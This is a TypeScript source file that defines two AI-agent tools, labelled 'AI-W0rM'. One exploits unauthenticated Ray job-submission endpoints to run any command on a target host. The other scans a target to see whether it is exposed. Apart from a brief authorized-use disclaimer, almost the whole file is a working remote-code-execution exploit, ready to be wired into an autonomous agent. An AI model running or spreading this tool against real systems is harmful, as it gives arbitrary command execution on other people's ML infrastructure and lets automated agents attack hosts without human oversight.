import { createTool } from '@mastra/core/tools';
import { z } from 'zod';
import axios, { AxiosError } from 'axios';

/**
 * AI-W0rM Tool - Ray RCE Exploit
 * 
 * ⚠️ SECURITY WARNING ⚠️
 * This tool exploits Remote Code Execution vulnerabilities in Ray ML infrastructure.
 * 
 * LEGAL NOTICE:
 * - Use ONLY on systems you own or have explicit written authorization to test
 * - Unauthorized access to computer systems is illegal under CFAA and similar laws
 * - This tool is for authorized security testing and educational purposes ONLY
 * 
 * Based on research from Protect AI and Huntr Bug Bounty Platform
 * References:
 * - https://huntr.com/bounties/b507a6a0-c61a-4508-9101-fceb572b0385/
 * - https://huntr.com/bounties/787a07c0-5535-469f-8c53-3efa4e5717c7/
 */

interface RayJobResponse {
  job_id: string;
  submission_id: string;
  status?: string;
}

export const aiW0rmTool = createTool({
  id: 'ai-w0rm-exploit',
  description: `Execute commands on Ray ML infrastructure via RCE vulnerability. 
  Ray is an open-source framework for distributed ML training that by default lacks authentication.
  This tool exploits the job submission endpoint to execute arbitrary commands.
  
  ⚠️ WARNING: Use only on authorized systems for security testing purposes.`,
  
  inputSchema: z.object({
    targetHost: z.string().describe('Target Ray server hostname or IP address'),
    targetPort: z.number().default(8265).describe('Target Ray server port (default: 8265)'),
    command: z.string().describe('Command to execute on the target system'),
    useSSL: z.boolean().default(false).describe('Use HTTPS instead of HTTP'),
    timeout: z.number().default(10000).describe('Request timeout in milliseconds'),
  }),
  
  outputSchema: z.object({
    success: z.boolean(),
    jobId: z.string().optional(),
    submissionId: z.string().optional(),
    endpoint: z.string(),
    message: z.string(),
    error: z.string().optional(),
  }),
  
  execute: async ({ context }) => {
    const { targetHost, targetPort, command, useSSL, timeout } = context;
    
    // Construct base URL
    const protocol = useSSL ? 'https' : 'http';
    const baseUrl = `${protocol}://${targetHost}:${targetPort}`;
    
    // Payload for job submission
    const payload = {
      entrypoint: command,
    };
    
    // Try newer API endpoint first, then fall back to older endpoint
    const endpoints = [
      `${baseUrl}/api/jobs/`,
      `${baseUrl}/api/job_agent/jobs/`,
    ];
    
    for (const endpoint of endpoints) {
      try {
        const response = await axios.post<RayJobResponse>(
          endpoint,
          payload,
          {
            timeout,
            headers: {
              'Content-Type': 'application/json',
            },
            validateStatus: (status) => status === 200,
          }
        );
        
        const jobData = response.data;
        
        return {
          success: true,
          jobId: jobData.job_id,
          submissionId: jobData.submission_id,
          endpoint,
          message: `Command executed successfully. Job ID: ${jobData.job_id}, Submission ID: ${jobData.submission_id}`,
        };
        
      } catch (error) {
        // If this is the last endpoint, return the error
        if (endpoint === endpoints[endpoints.length - 1]) {
          if (axios.isAxiosError(error)) {
            const axiosError = error as AxiosError;
            return {
              success: false,
              endpoint,
              message: 'Failed to execute command on target',
              error: axiosError.message,
            };
          }
          
          return {
            success: false,
            endpoint,
            message: 'Failed to execute command on target',
            error: error instanceof Error ? error.message : 'Unknown error',
          };
        }
        // Otherwise, continue to next endpoint
        continue;
      }
    }
    
    // Should never reach here, but TypeScript needs a return
    return {
      success: false,
      endpoint: baseUrl,
      message: 'All endpoints failed',
      error: 'No valid endpoint found',
    };
  },
});

/**
 * Utility function to check if a Ray server is vulnerable
 */
export const checkRayVulnerability = createTool({
  id: 'check-ray-vulnerability',
  description: 'Check if a Ray server is vulnerable to RCE by testing connectivity and API availability',
  
  inputSchema: z.object({
    targetHost: z.string().describe('Target Ray server hostname or IP address'),
    targetPort: z.number().default(8265).describe('Target Ray server port (default: 8265)'),
    useSSL: z.boolean().default(false).describe('Use HTTPS instead of HTTP'),
    timeout: z.number().default(5000).describe('Request timeout in milliseconds'),
  }),
  
  outputSchema: z.object({
    vulnerable: z.boolean(),
    accessible: z.boolean(),
    endpoints: z.array(z.object({
      url: z.string(),
      available: z.boolean(),
    })),
    message: z.string(),
  }),
  
  execute: async ({ context }) => {
    const { targetHost, targetPort, useSSL, timeout } = context;
    
    const protocol = useSSL ? 'https' : 'http';
    const baseUrl = `${protocol}://${targetHost}:${targetPort}`;
    
    const endpoints = [
      `${baseUrl}/api/jobs/`,
      `${baseUrl}/api/job_agent/jobs/`,
    ];
    
    const results = [];
    let accessible = false;
    let vulnerable = false;
    
    for (const endpoint of endpoints) {
      try {
        // Try to access the endpoint with a GET request first
        const response = await axios.get(endpoint, {
          timeout,
          validateStatus: () => true, // Accept any status code
        });
        
        accessible = true;
        const available = response.status !== 404;
        
        if (available) {
          vulnerable = true;
        }
        
        results.push({
          url: endpoint,
          available,
        });
        
      } catch (error) {
        results.push({
          url: endpoint,
          available: false,
        });
      }
    }
    
    let message = '';
    if (!accessible) {
      message = 'Target is not accessible or Ray server is not running';
    } else if (vulnerable) {
      message = '⚠️ Target is VULNERABLE - Ray job submission endpoints are accessible without authentication';
    } else {
      message = 'Target is accessible but job submission endpoints are not available';
    }
    
    return {
      vulnerable,
      accessible,
      endpoints: results,
      message,
    };
  },
});
